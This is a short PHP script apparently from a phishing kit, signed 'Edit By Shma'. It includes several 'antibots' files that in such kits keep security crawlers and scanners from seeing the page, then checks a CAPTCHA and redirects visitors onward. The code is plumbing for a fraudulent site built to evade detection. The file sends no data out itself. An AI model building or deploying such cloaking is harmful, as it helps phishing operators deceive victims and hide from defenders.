<?php
/*   
  /$$$$$$  /$$                              
 /$$__  $$| $$                              
| $$  \__/| $$$$$$$  /$$$$$$/$$$$   /$$$$$$ 
|  $$$$$$ | $$__  $$| $$_  $$_  $$ |____  $$
 \____  $$| $$  \ $$| $$ \ $$ \ $$  /$$$$$$$
 /$$  \ $$| $$  | $$| $$ | $$ | $$ /$$__  $$
|  $$$$$$/| $$  | $$| $$ | $$ | $$|  $$$$$$$
\______/ |__/  |__/|__/ |__/ |__/ \_______/


               ###################Contact#####################
               #               Captcher Ver.3                #
               #               Edit By Shma                  #
               #               fb:fb.com/Shma.Hack           #
			   ###############################################
*/
session_start();
error_reporting(0);
//------------------------------------------|| ANTIBOTS DZEB ||-----------------------------------------------------//
include "./BOTS/antibots1.php";
include "./BOTS/antibots2.php";
include "./BOTS/antibots3.php";
include "./BOTS/antibots4.php";
include "./BOTS/antibots5.php";
include "./BOTS/antibots6.php";
include "./BOTS/xBananaBotsPerfect.php";
// check if session from image.php is set, and user input is present...
if(isset($_SESSION['captcha']) && isset($_POST['captcha'])){
// check if code from user matches session.
if($_POST['captcha'] == $_SESSION['captcha']){
// success
// unset session code (so that user can not repost same code twice)
unset($_SESSION['captcha']);
header("Location: Done.php");
}else{
// failed
// invalidate code if antibot fails...
unset($_SESSION['captcha']);
header("Location: fails.php");
}
}else{
// if session was not set, send back to index.php  -  Probable to be browsed directly instead of referred to by html page, therefore redirect to index.
header("Location: indexxx.php");
die;
}
?>